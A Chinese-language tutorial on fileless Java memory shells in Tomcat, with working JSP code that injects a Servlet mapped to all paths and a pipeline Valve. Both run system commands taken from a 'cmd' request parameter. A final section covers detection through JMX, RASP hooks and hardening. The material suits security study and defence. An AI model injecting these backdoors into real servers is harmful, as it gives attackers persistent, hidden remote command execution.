摘要

内存马（Memory Shellcode）作为一种无文件落地的攻击技术，在近年来的Web安全攻防中扮演着重要角色。它通过在目标应用的内存中动态注册恶意组件，实现持久化控制且难以被传统文件扫描工具发现。本文聚焦Java平台，深入剖析两种基于Tomcat容器的内存马实现——Servlet内存马与Valve内存马。我们将从基础原理出发，结合手写代码演示具体实现步骤，并探讨防御与检测方法，旨在帮助读者全面理解内存马的运作机制。

1. 引言

1.1 什么是内存马？

传统Webshell通常以文件形式存在于服务器磁盘上，容易被安全设备（如WAF、文件监控）发现。内存马则直接将恶意代码注入到运行时内存中，不写入磁盘，从而绕过基于文件的检测。在Java环境中，攻击者常利用动态注册Servlet、Filter、Listener或Valve等组件的方式，将后门驻留在Web容器内部。

1.2 内存马的常见类型

Tomcat作为主流Java Web容器，提供了多种扩展点。常见的内存马类型包括：

· Servlet型：动态添加一个恶意Servlet，通过特定URL触发。
· Filter型：注册恶意过滤器，拦截并处理请求。
· Listener型：通过监听器在特定事件（如session创建）时执行代码。
· Valve型：利用Tomcat管道机制，插入自定义Valve，在请求处理早期介入。

本文选取Servlet和Valve两种具有代表性的类型，从理论到实践进行深入讲解。

2. 基础知识

2.1 Tomcat核心组件与请求处理流程

Tomcat的容器体系由四个层次构成：Engine（引擎）、Host（主机）、Context（上下文，对应一个Web应用）、Wrapper（包装器，对应一个Servlet）。每个容器内部都包含一个管道（Pipeline）和多个阀门（Valve）。请求处理流程如下：

1. 请求到达Engine的管道，依次经过其阀门。
2. 递交给Host管道处理。
3. 进入Context管道。
4. 最终到达Wrapper管道，由对应的Servlet处理。

每个容器都有独立的Pipeline，通过getPipeline().getFirst().invoke(...)触发。管道中的阀门可以拦截请求并执行自定义逻辑，这为Valve内存马提供了基础。

2.2 Servlet动态注册原理

Servlet标准规定了通过ServletContext动态注册Servlet的方法（如addServlet），但在Tomcat底层实现中，实际是操作StandardContext类。StandardContext维护了子组件（Wrapper）集合和URL映射表。关键步骤：

· 创建Wrapper实例，设置名称、Servlet类及实例。
· 调用context.addChild(wrapper)将Wrapper加入容器。
· 调用context.addServletMappingDecoded(urlPattern, wrapperName)建立映射关系。

2.3 反射机制的作用

内存马实现需要获取关键的StandardContext对象，而该对象通常不直接暴露在请求上下文中。通过反射访问Request对象的私有字段（如request），可以获得底层Tomcat原生Request，进而获取Context。反射是内存马手搓过程中的核心技术。

3. Servlet内存马

3.1 Servlet标准部署方式回顾

常规Servlet部署通过web.xml或注解@WebServlet完成。例如：

```xml
<servlet>
    <servlet-name>servletDemo</servlet-name>
    <servlet-class>com.test.ServletDemo</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>servletDemo</servlet-name>
    <url-pattern>/demo</url-pattern>
</servlet-mapping>
```

容器启动时读取配置，解析并注册Servlet。而内存马则是在运行时模拟这一过程。

3.2 动态注册Servlet的核心原理

从上述配置可知，注册一个Servlet需要两个要素：Servlet本身和URL映射。Tomcat使用org.apache.catalina.Wrapper表示Servlet实例，使用StandardContext管理所有Wrapper和映射。因此，动态注册的关键在于：

1. 获取当前Web应用的StandardContext对象。
2. 创建并配置Wrapper。
3. 将Wrapper添加到StandardContext的子容器中。
4. 添加URL映射。

3.3 内存马实现步骤（JSP形式）

以下JSP代码演示了如何注入一个恶意Servlet，访问任意路径即可执行命令。假设已有名为HelloServlet的恶意类（简单实现命令执行）。

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%
    // 步骤1：通过反射获取当前请求对应的StandardContext
    Field reqField = request.getClass().getDeclaredField("request");
    reqField.setAccessible(true);
    Request req = (Request) reqField.get(request);
    StandardContext context = (StandardContext) req.getContext();

    // 步骤2：创建Wrapper并设置Servlet信息
    Wrapper wrapper = context.createWrapper();
    wrapper.setName("hackerServlet");                       // Servlet名称
    wrapper.setServletClass(HelloServlet.class.getName());  // 类名
    wrapper.setServlet(new HelloServlet());                  // 实例（可选，也可让容器延迟加载）

    // 步骤3：将Wrapper添加到Context
    context.addChild(wrapper);

    // 步骤4：添加URL映射（/* 表示拦截所有请求）
    context.addServletMappingDecoded("/*", "hackerServlet");

    out.println("Servlet内存马注入成功！");
%>
```

代码解析：

· request.getClass().getDeclaredField("request")：JSP中的request是org.apache.catalina.connector.RequestFacade，它内部包装了真正的Request对象。通过反射获取该字段。
· req.getContext()：获取StandardContext实例。
· context.createWrapper()：由StandardContext创建空Wrapper。
· 设置Wrapper的name、servletClass和servlet实例。注意，setServlet是可选的，如果设置了，容器会直接使用该实例；否则会在首次请求时通过servletClass反射实例化。
· addChild将Wrapper加入容器。
· addServletMappingDecoded将URL模式映射到Wrapper的名称。

注意事项：

· 需要引入Tomcat依赖（如tomcat-catalina）以获取相关类。
· 如果使用Java Agent或框架漏洞（如反序列化）注入，需考虑类加载器问题，确保HelloServlet可被加载。
· 映射的URL模式若与已有冲突，可能覆盖原有路由。

4. Tomcat-Valve内存马

4.1 Valve概念与管道模式

Valve（阀门）是Tomcat管道模型中的组件，允许在请求处理流程中插入自定义逻辑。每个容器（Engine、Host、Context、Wrapper）都有自己的管道，管道由多个Valve组成，最后一个Valve通常是标准实现（如StandardEngineValve）。通过添加自定义Valve，可以在请求到达Servlet之前或之后执行代码，例如权限检查、日志记录等。

4.2 Valve的正常使用方式

自定义Valve需继承ValveBase并重写invoke方法：

```java
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd == null) {
            getNext().invoke(request, response); // 传递给下一个阀门
        } else {
            Runtime.getRuntime().exec(cmd);
        }
    }
}
```

部署方式：

· 全局生效：修改$CATALINA_BASE/conf/context.xml，添加<Valve className="com.test.TestValve" />。
· 应用单独生效：在Web应用的META-INF/context.xml中配置。

4.3 动态添加Valve的原理

动态注入Valve的思路与Servlet类似：获取目标容器的Pipeline，然后调用addValve方法添加自定义Valve实例。由于Valve在请求早期介入，往往能获得更广泛的控制能力。

4.4 内存马实现步骤

以下JSP代码演示如何向当前Context的管道中添加一个恶意Valve，该Valve会在每个请求中检查cmd参数并执行系统命令。

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="java.io.IOException" %>
<%
    // 步骤1：获取StandardContext
    Field reqField = request.getClass().getDeclaredField("request");
    reqField.setAccessible(true);
    Request req = (Request) reqField.get(request);
    StandardContext context = (StandardContext) req.getContext();

    // 步骤2：获取Pipeline
    Pipeline pipeline = context.getPipeline();

    // 步骤3：定义恶意Valve（也可单独编译成类）
    class CmdValve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            // 继续传递请求，避免影响正常业务
            getNext().invoke(request, response);
        }
    }

    // 步骤4：实例化并添加
    Valve cmdValve = new CmdValve();
    pipeline.addValve(cmdValve);

    out.println("Valve内存马注入成功！");
%>
```

代码解析：

· 获取StandardContext的方式与Servlet马一致。
· context.getPipeline()返回该上下文的管道实例。
· 动态定义一个内部类CmdValve，继承ValveBase并实现invoke方法。在实际攻击中，此类通常预编译成独立类以简化代码。
· pipeline.addValve(cmdValve)将Valve添加到管道末尾（注意：添加顺序影响执行顺序，通常新Valve会被添加到现有阀门之后）。

优势：Valve在请求处理流程中位置更靠前，可以捕获所有进入该Context的请求，甚至包括静态资源请求，隐蔽性更强。

4.5 与其他内存马类型的对比

类型 注册方式 触发时机 优点 缺点
Servlet 添加Wrapper+映射 URL匹配 实现简单，类似后门URL 容易通过URL扫描发现
Filter 添加FilterDef+FilterMap 请求处理前/后 可拦截所有请求 需要处理链顺序
Valve 添加到Pipeline 管道执行阶段 位置靠前，功能强大 可能影响容器稳定性
Listener 添加监听器 特定事件触发 隐蔽，适合反弹shell等 触发条件限制

5. 防御与检测

5.1 如何检测内存马？

内存马无文件落地，但会在容器运行时数据结构中留下痕迹。检测方法包括：

· JMX/MBean监控：Tomcat通过JMX暴露MBean，可以查看当前注册的Servlet、Filter、Valve等。例如，Catalina:type=Deployer可查看应用，Catalina:type=Valve,path=/xxx可查看Valve。
· 代码审计与反射调用监控：在JVM级别监控敏感API调用（如addChild、addValve、setServlet），记录调用栈。
· 流量特征分析：内存马通常包含命令执行参数（如cmd），可分析HTTP请求参数异常。
· 内存转储分析：对Java进程进行堆转储，分析其中的组件实例。

5.2 加固Tomcat配置

· 启用SecurityManager：限制反射、文件读写等权限，阻止恶意代码获取关键对象。
· 最小化权限：运行Tomcat使用低权限用户。
· 限制类加载：避免应用加载任意字节码，如使用白名单类加载器。

5.3 监控关键API

通过Java Agent或RASP（运行时应用自我保护）技术，Hook关键方法：

· StandardContext.addChild
· StandardContext.addServletMappingDecoded
· Pipeline.addValve
· ApplicationContext.addFilter等

当这些方法被非正常调用时（如来自JSP或反序列化），可触发告警或阻断。

6. 总结

本文从理论到实践，详细阐述了Servlet内存马和Tomcat-Valve内存马的实现原理与手搓代码。内存马作为高级攻防技术，既体现了Java Web容器灵活性的双刃剑特性，也提醒我们在安全防御中需深入理解底层实现。通过本文的学习，读者不仅能掌握具体攻击手法，更能加深对Tomcat架构、类加载机制及反射应用的理解。在实际防御中，应结合RASP、JMX监控和权限控制，构建纵深防御体系。

内存无文件，攻防有痕。唯有深入理解内部机制，才能在对抗中占据主动。
